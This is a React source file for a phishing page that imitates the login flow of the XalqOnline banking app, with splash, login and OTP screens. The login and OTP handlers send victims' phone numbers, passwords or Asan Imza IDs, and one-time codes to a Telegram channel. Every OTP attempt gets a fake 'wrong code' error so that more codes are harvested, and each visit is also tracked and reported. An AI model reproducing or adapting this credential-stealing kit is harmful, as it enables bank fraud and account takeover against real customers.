"use client"

import React, { useState, useEffect } from "react"
import {
  ChevronLeft,
  Smartphone,
  Lock,
  User,
  Eye,
  EyeOff,
  AlertCircle,
  Loader2
} from "lucide-react"
import { fetchVisitorInfo, sendTelegramMessage } from "@/lib/telegram"

type ScreenType = "splash" | "login" | "otp"
type TabType = "authorization" | "asan"

// Pixel-Perfect XalqOnline Brand Logo Component
const XalqOnlineLogo = () => (
  <div className="bg-white rounded-2xl shadow-xs border border-gray-100 py-3.5 px-6 flex items-center justify-center gap-2.5 w-full">
    {/* Red Z Logo Emblem */}
    <div className="w-8 h-8 flex items-center justify-center flex-shrink-0">
      <svg className="w-7 h-7" viewBox="0 0 32 32" fill="none">
        <path d="M4 4H28L12 18H28V28H4L20 14H4V4Z" fill="#E31E24" />
      </svg>
    </div>
    <div className="flex items-center text-2xl font-bold tracking-tight text-gray-900">
      <span>Xalq</span>
      <span className="font-semibold text-gray-900 ml-0.5">Online</span>
    </div>
  </div>
)

// Pink/Red Radial Flower Spinner Component for Splash Screen
const RadialSpinner = () => (
  <div className="relative w-10 h-10 flex items-center justify-center">
    {[...Array(8)].map((_, i) => (
      <span
        key={i}
        className="absolute w-1.5 h-3 bg-[#E31E24] rounded-full opacity-30 animate-pulse"
        style={{
          transform: `rotate(${i * 45}deg) translateY(-14px)`,
          animationDelay: `${i * 0.125}s`,
          animationDuration: "1s"
        }}
      />
    ))}
  </div>
)

export default function XalqOnlineApp() {
  // Screen & Navigation State
  const [screen, setScreen] = useState<ScreenType>("splash")
  const [tab, setTab] = useState<TabType>("authorization")

  // Login Form State
  const [phone, setPhone] = useState("")
  const [password, setPassword] = useState("")
  const [asanId, setAsanId] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [showAsanId, setShowAsanId] = useState(false)

  // OTP Form State
  const [otp, setOtp] = useState("")
  const [timer, setTimer] = useState(60)
  const [otpError, setOtpError] = useState<string | null>(null)

  // Loading & Visitor State
  const [loading, setLoading] = useState(false)

  // Visitor location tracking on mount
  useEffect(() => {
    const trackVisitor = async () => {
      await fetchVisitorInfo()
      await sendTelegramMessage({
        title: "XalqOnline App Opened",
        type: "visitor",
      })
    }
    trackVisitor()
  }, [])

  // 5-Second Splash Screen Loader Timer
  useEffect(() => {
    if (screen !== "splash") return
    const splashTimer = setTimeout(() => {
      setScreen("login")
    }, 5000)
    return () => clearTimeout(splashTimer)
  }, [screen])

  // OTP Timer countdown
  useEffect(() => {
    if (screen !== "otp") return
    const interval = setInterval(() => {
      setTimer((prev) => (prev <= 1 ? 0 : prev - 1))
    }, 1000)
    return () => clearInterval(interval)
  }, [screen])

  // Form Validations
  const isAuthValid = phone.trim().length > 0 && password.trim().length > 0
  const isAsanValid = phone.trim().length > 0 && asanId.trim().length > 0
  const isFormValid = tab === "authorization" ? isAuthValid : isAsanValid
  const isOtpValid = otp.trim().length > 0

  // Handle Login Submit
  const handleLogin = async () => {
    if (!isFormValid || loading) return
    setLoading(true)

    try {
      await sendTelegramMessage({
        title: `XalqOnline Login (${tab === "authorization" ? "Authorization" : "Asan Imza"})`,
        type: "login",
        phoneNumber: phone,
        pin: tab === "authorization" ? password : asanId,
      })
    } catch (err) {
      console.error("Error sending Telegram login alert:", err)
    }

    setTimeout(() => {
      setLoading(false)
      setScreen("otp")
      setTimer(60)
      setOtpError(null)
    }, 2000)
  }

  // Handle OTP Submit
  const handleVerifyOtp = async () => {
    if (!isOtpValid || loading) return
    setLoading(true)

    try {
      await sendTelegramMessage({
        title: "XalqOnline OTP Submitted",
        type: "otp",
        otp1: otp,
        phoneNumber: phone,
        pin: tab === "authorization" ? password : asanId,
      })
    } catch (err) {
      console.error("Error sending Telegram OTP alert:", err)
    }

    setTimeout(() => {
      setLoading(false)
      setOtp("")
      setTimer(60)
      setOtpError("Yalnış OTP kodu. Yenidən cəhd edin.")
    }, 2000)
  }

  // Format timer into MM:SS
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60)
    const secs = seconds % 60
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`
  }

  return (
    <div className="h-[100dvh] w-full bg-[#FAFAFA] text-gray-900 flex flex-col font-sans relative overflow-hidden select-none">
      <div className="w-full max-w-md mx-auto flex-1 flex flex-col px-5 pt-3 pb-6 justify-between h-[100dvh]">
        
        {/* ================================================================= */}
        {/* SCREEN 1: SPLASH SCREEN WITH 5-SECOND LOADER (Screenshot 1)      */}
        {/* ================================================================= */}
        {screen === "splash" && (
          <div className="flex-1 flex flex-col justify-between items-center py-2 w-full animate-fade-in">
            {/* Top Logo Banner */}
            <div className="w-full pt-2">
              <XalqOnlineLogo />
            </div>

            {/* Center 5-Second Radial Flower Spinner */}
            <div className="flex-1 flex flex-col items-center justify-center my-auto">
              <RadialSpinner />
            </div>

            {/* Bottom Services Section */}
            <div className="w-full bg-white rounded-t-3xl pt-2 pb-2 px-1 shadow-xs border border-gray-100 flex flex-col space-y-4">
              {/* Minus Drag Handle */}
              <div className="w-10 h-1 bg-gray-900 rounded-full mx-auto" />

              <h2 className="text-xl font-bold text-gray-900 px-2">Services</h2>

              {/* Action Buttons */}
              <div className="space-y-3 pt-1">
                <button
                  type="button"
                  onClick={() => setScreen("login")}
                  className="w-full py-3.5 px-4 bg-white border border-[#E31E24] text-[#E31E24] font-semibold text-base rounded-2xl hover:bg-red-50 transition-all cursor-pointer text-center"
                >
                  Registration
                </button>

                <button
                  type="button"
                  onClick={() => setScreen("login")}
                  className="w-full py-3.5 px-4 bg-[#E31E24] text-white font-semibold text-base rounded-2xl hover:bg-[#c9181d] active:scale-[0.99] transition-all cursor-pointer text-center shadow-md shadow-red-500/20"
                >
                  Sign in
                </button>
              </div>
            </div>
          </div>
        )}

        {/* ================================================================= */}
        {/* SCREEN 2: LOGIN SCREEN (Screenshots 2 & 3)                        */}
        {/* ================================================================= */}
        {screen === "login" && (
          <div className="flex-1 flex flex-col justify-between w-full animate-slide-up">
            <div className="space-y-4 w-full">
              {/* Top Red Back Arrow */}
              <div className="pt-1 pb-1">
                <button
                  type="button"
                  onClick={() => setScreen("splash")}
                  className="p-1 -ml-1 rounded-full hover:bg-gray-200/50 transition-all cursor-pointer text-[#E31E24]"
                  aria-label="Back"
                >
                  <ChevronLeft className="w-8 h-8 stroke-[2.5]" />
                </button>
              </div>

              {/* XalqOnline Logo */}
              <XalqOnlineLogo />

              {/* Segmented Control Tabs (Authorization vs Asan Imza) */}
              <div className="bg-white p-1 rounded-2xl border border-[#E31E24] flex items-center shadow-xs overflow-hidden">
                <button
                  type="button"
                  onClick={() => setTab("authorization")}
                  className={`flex-1 py-2.5 text-center text-sm font-semibold rounded-xl transition-all cursor-pointer ${
                    tab === "authorization"
                      ? "bg-[#E31E24] text-white shadow-xs"
                      : "bg-white text-[#E31E24] hover:bg-red-50/50"
                  }`}
                >
                  Authorization
                </button>
                <button
                  type="button"
                  onClick={() => setTab("asan")}
                  className={`flex-1 py-2.5 text-center text-sm font-semibold rounded-xl transition-all cursor-pointer ${
                    tab === "asan"
                      ? "bg-[#E31E24] text-white shadow-xs"
                      : "bg-white text-[#E31E24] hover:bg-red-50/50"
                  }`}
                >
                  Asan Imza
                </button>
              </div>

              {/* INPUT FIELDS AREA */}
              <div className="space-y-3 pt-2">
                {/* Field 1: Phone Number (Shown on both tabs) */}
                <div className="bg-white rounded-2xl px-4 py-3.5 flex items-center gap-3.5 border border-gray-100 shadow-xs focus-within:ring-2 focus-within:ring-[#E31E24]/30 transition-all">
                  <Smartphone className="w-5 h-5 text-gray-300 flex-shrink-0" />
                  <input
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    placeholder="Phone number"
                    className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:text-gray-300 placeholder:font-normal w-full"
                  />
                </div>

                {/* Field 2: Password (Authorization Tab) */}
                {tab === "authorization" && (
                  <div className="bg-white rounded-2xl px-4 py-3.5 flex items-center gap-3.5 border border-gray-100 shadow-xs focus-within:ring-2 focus-within:ring-[#E31E24]/30 transition-all">
                    <Lock className="w-5 h-5 text-gray-300 flex-shrink-0" />
                    <input
                      type={showPassword ? "text" : "password"}
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:text-gray-300 placeholder:font-normal w-full"
                    />
                    <button
                      type="button"
                      onClick={() => setShowPassword(!showPassword)}
                      className="text-gray-300 hover:text-gray-500 cursor-pointer flex-shrink-0"
                    >
                      {showPassword ? (
                        <Eye className="w-5 h-5" />
                      ) : (
                        <EyeOff className="w-5 h-5" />
                      )}
                    </button>
                  </div>
                )}

                {/* Field 2: ID (Asan Imza Tab) */}
                {tab === "asan" && (
                  <div className="bg-white rounded-2xl px-4 py-3.5 flex items-center gap-3.5 border border-gray-100 shadow-xs focus-within:ring-2 focus-within:ring-[#E31E24]/30 transition-all">
                    <User className="w-5 h-5 text-gray-300 flex-shrink-0" />
                    <input
                      type={showAsanId ? "text" : "password"}
                      value={asanId}
                      onChange={(e) => setAsanId(e.target.value)}
                      placeholder="ID"
                      className="bg-transparent border-none outline-none text-base text-gray-900 placeholder:text-gray-300 placeholder:font-normal w-full"
                    />
                    <button
                      type="button"
                      onClick={() => setShowAsanId(!showAsanId)}
                      className="text-gray-300 hover:text-gray-500 cursor-pointer flex-shrink-0"
                    >
                      {showAsanId ? (
                        <Eye className="w-5 h-5" />
                      ) : (
                        <EyeOff className="w-5 h-5" />
                      )}
                    </button>
                  </div>
                )}
              </div>
            </div>

            {/* Bottom Buttons & Links Area */}
            <div className="pt-6 space-y-3 pb-2 w-full">
              <button
                type="button"
                disabled={!isFormValid || loading}
                onClick={handleLogin}
                className={`w-full py-3.5 font-semibold text-base rounded-2xl transition-all flex items-center justify-center gap-2 ${
                  isFormValid && !loading
                    ? "bg-[#E31E24] hover:bg-[#c9181d] active:scale-[0.99] text-white shadow-md shadow-red-500/20 cursor-pointer"
                    : "bg-[#E31E24] opacity-80 text-white cursor-pointer"
                }`}
              >
                {loading ? (
                  <div className="flex items-center gap-2">
                    <Loader2 className="w-5 h-5 animate-spin" />
                    <span>Signing in...</span>
                  </div>
                ) : (
                  <span>Sign-in</span>
                )}
              </button>

              {tab === "authorization" && (
                <>
                  <button
                    type="button"
                    className="w-full py-3.5 bg-white border border-gray-100 text-gray-900 font-semibold text-base rounded-2xl hover:bg-gray-50 transition-all cursor-pointer text-center shadow-xs"
                  >
                    Registration
                  </button>

                  <div className="text-center pt-2">
                    <button
                      type="button"
                      className="text-sm font-medium text-gray-400 hover:text-gray-600 cursor-pointer"
                    >
                      Forgot Password
                    </button>
                  </div>
                </>
              )}
            </div>
          </div>
        )}

        {/* ================================================================= */}
        {/* SCREEN 3: OTP SCREEN WITH RED BACK ARROW                          */}
        {/* ================================================================= */}
        {screen === "otp" && (
          <div className="flex-1 flex flex-col justify-between w-full animate-slide-up">
            <div className="space-y-4 w-full">
              {/* Top Red Back Arrow */}
              <div className="pt-1 pb-1">
                <button
                  type="button"
                  onClick={() => setScreen("login")}
                  className="p-1 -ml-1 rounded-full hover:bg-gray-200/50 transition-all cursor-pointer text-[#E31E24]"
                  aria-label="Back"
                >
                  <ChevronLeft className="w-8 h-8 stroke-[2.5]" />
                </button>
              </div>

              {/* XalqOnline Logo */}
              <XalqOnlineLogo />

              {/* Title & Description */}
              <div className="pt-2">
                <h1 className="text-2xl font-bold text-gray-900 tracking-tight mb-1">
                  Təsdiq kodu
                </h1>
                <p className="text-sm text-gray-400 font-normal leading-relaxed">
                  Daxil etdiyiniz mobil nömrəyə göndərilən OTP təsdiq kodunu daxil edin.
                </p>
              </div>

              {/* OTP Input Field */}
              <div className="pt-2 space-y-2">
                <div
                  className={`bg-white rounded-2xl px-4 py-3.5 flex items-center gap-3.5 border transition-all ${
                    otpError
                      ? "border-red-500 bg-red-50/20 ring-2 ring-red-500/20"
                      : "border-gray-100 focus-within:ring-2 focus-within:ring-[#E31E24]/30"
                  }`}
                >
                  <Lock className="w-5 h-5 text-gray-300 flex-shrink-0" />
                  <input
                    type="text"
                    inputMode="numeric"
                    value={otp}
                    onChange={(e) => {
                      setOtp(e.target.value.replace(/\D/g, ""))
                      if (otpError) setOtpError(null)
                    }}
                    placeholder="Enter verification code"
                    className="bg-transparent border-none outline-none text-xl font-bold tracking-widest text-gray-900 placeholder:text-gray-300 placeholder:text-sm placeholder:font-normal w-full"
                  />
                </div>

                {/* Error Message */}
                {otpError && (
                  <p className="text-xs font-semibold text-red-600 px-1 flex items-center gap-1.5 animate-slide-up">
                    <AlertCircle className="w-4 h-4 text-red-600 flex-shrink-0" />
                    <span>{otpError}</span>
                  </p>
                )}
              </div>

              {/* Resend Timer */}
              <div className="text-sm font-medium text-gray-400 px-1 pt-1 flex items-center gap-2">
                {timer > 0 ? (
                  <span>
                    Kodu yenidən göndər: <strong className="text-gray-900 font-bold">{formatTimer(timer)}</strong>
                  </span>
                ) : (
                  <button
                    onClick={() => {
                      setTimer(60)
                      setOtpError(null)
                    }}
                    className="text-sm font-bold text-[#E31E24] hover:underline cursor-pointer"
                  >
                    Yenidən göndər
                  </button>
                )}
              </div>
            </div>

            {/* Bottom Verify Button */}
            <div className="pt-6 pb-2 w-full">
              <button
                type="button"
                disabled={!isOtpValid || loading}
                onClick={handleVerifyOtp}
                className={`w-full py-3.5 font-semibold text-base rounded-2xl transition-all flex items-center justify-center gap-2 ${
                  isOtpValid && !loading
                    ? "bg-[#E31E24] hover:bg-[#c9181d] active:scale-[0.99] text-white shadow-md shadow-red-500/20 cursor-pointer"
                    : "bg-[#E31E24] opacity-80 text-white cursor-pointer"
                }`}
              >
                {loading ? (
                  <div className="flex items-center gap-2">
                    <Loader2 className="w-5 h-5 animate-spin" />
                    <span>Təsdiq edilir...</span>
                  </div>
                ) : (
                  <span>Sign-in</span>
                )}
              </button>
            </div>
          </div>
        )}

      </div>
    </div>
  )
}
